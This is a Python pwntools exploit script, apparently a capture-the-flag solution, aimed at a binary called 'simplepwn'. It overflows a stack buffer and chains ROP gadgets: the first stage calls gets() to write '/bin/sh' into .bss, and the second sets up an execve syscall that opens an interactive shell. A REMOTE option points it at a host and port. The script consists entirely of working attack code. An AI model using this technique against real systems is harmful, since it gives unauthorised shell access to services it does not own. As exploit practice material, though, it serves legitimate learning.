from pwn import *

def con(argv=[], *a, **kw):
	if args.REMOTE:
		return remote(sys.argv[1], sys.argv[2], *a, **kw)
	elif args.GDB:
		return gdb.debug(exe, gdbscript='''
            b *0x00000000004011a7
			c
			''')
	else:
		return process(exe)


exe = './simplepwn'
io = con()
elf = context.binary = ELF(exe, checksec = False)
context.log_level = 'info'

offset = 120


bss = 0x0000000000408220 
pop_rax = 0x0000000000401001
pop_rdi = 0x0000000000403029 
pop_rsi = 0x000000000040499b
syscall = 0x00000000004041b4
ret = 0x0000000000401002
new_rbp = 0x0000000000408000 + 0x20
gets = elf.sym['gets']
main = elf.sym['main']
payload = b'A'*112 + p64(new_rbp)
payload += p64(pop_rdi) + p64(bss)
payload += p64(gets)
payload += p64(main)

io.sendline(payload)
info(payload)
io.sendline(b'/bin/sh\x00')

payload = b'A'*112 + p64(new_rbp)
payload += p64(pop_rax) + p64(0x3b)
payload += p64(pop_rdi) + p64(bss)
payload += p64(pop_rsi) + p64(0)
payload += p64(0x0000000000404514) + p64(0x0000000000408100)
payload += b'A'*0x28
payload += p64(syscall)
io.sendline(payload)

io.interactive()
